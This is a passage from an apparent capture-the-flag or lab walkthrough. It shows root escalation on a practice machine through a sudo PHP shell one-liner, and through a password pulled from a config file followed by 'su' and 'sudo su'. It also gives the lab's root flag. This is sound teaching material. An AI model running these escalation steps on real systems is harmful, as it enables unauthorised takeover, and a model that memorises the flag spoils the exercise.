www-data@gettingstarted:/var/www/html/theme/Innovation$ sudo php -r "system('/bin/bash');"
root@gettingstarted:/var/www/html/theme/Innovation\# whoami

root
```

A second approach is by running `linpeas` and noticing that the configuration file `/var/www/html/gsconfig.php` exposes the password `P@ss0rd`:

```shell
cat gsconfig.php
```
```
www-data@gettingstarted:/var/www/html$ cat gsconfig.php

<SNIP>
\# Extra salt to secure your password with. 
Default is empty for backwards compatibility.
\#define('GSLOGINSALT', 'your_unique_phrase');
\#define('GSLOGINSALT', 'P@ssw0rd');
<SNIP>
```

Students then need to use this password to sign in as the user `mrb3n`, who can run as `root` all commands. Thus, students then can sign in as the user `root` and read the contents of the "root.txt" flag, finding it to be `f1fba6e9f71efb2630e6e34da6387842`:

```shell
su mrb3n
sudo su -
cat root.txt
```
```
www-data@gettingstarted:/var/www/html$ su mrb3n
Password: P@ssw0rd

mrb3n@gettingstarted:/var/www/html$ sudo -l
[sudo] password for mrb3n: P@ssw0rd

Matching Defaults entries for mrb3n on gettingstarted:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:
	/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User mrb3n may run the following commands on gettingstarted:
    (ALL : ALL) ALL
mrb3n@gettingstarted:/var/www/html$ sudo su -
root@gettingstarted:~\
```